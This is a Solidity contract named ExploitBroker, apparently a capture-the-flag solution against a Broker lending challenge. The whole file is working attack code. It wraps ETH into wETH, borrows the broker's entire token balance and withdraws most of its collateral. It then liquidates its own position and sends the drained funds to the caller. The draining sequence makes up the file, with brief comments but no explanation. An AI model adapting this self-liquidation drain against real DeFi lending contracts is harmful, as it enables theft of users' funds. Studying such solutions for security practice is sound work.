pragma solidity 0.8.0;

import {Broker, iWETH9} from "./Broker.sol";
import {Token} from "./SetupBroker.sol";

contract ExploitBroker {

    iWETH9 public weth;
    Token public token;
    Broker public broker;

    constructor(address _token, address _weth, address _broker) {

        token = Token(_token);
        weth = iWETH9(_weth);
        broker = Broker(_broker);

    }

    function execute() public payable {
        
        // change ETH for wETH
        uint256 _amount = msg.value;
        weth.deposit{value: _amount}();

        // deposit 25 wETH to the broker
        weth.approve(address(broker), _amount);
        broker.deposit(_amount);

        // borrow the entire broker balance of tokens
        uint256 _tokenBalance = token.balanceOf(address(broker));
        broker.borrow(_tokenBalance);


        uint256 _x = (_tokenBalance * 3) / (broker.rate() * 2);
        broker.withdraw(_amount - _x);

        token.approve(address(broker), _tokenBalance);
        broker.liquidate(address(this), _tokenBalance);


        broker.withdraw(_x);
        weth.withdraw(weth.balanceOf(address(this)));

        (bool sent,) = msg.sender.call{value: address(this).balance, gas: 1024}("");
        require(sent, "Money are not transaferred");
    }

    receive() external payable {} 
}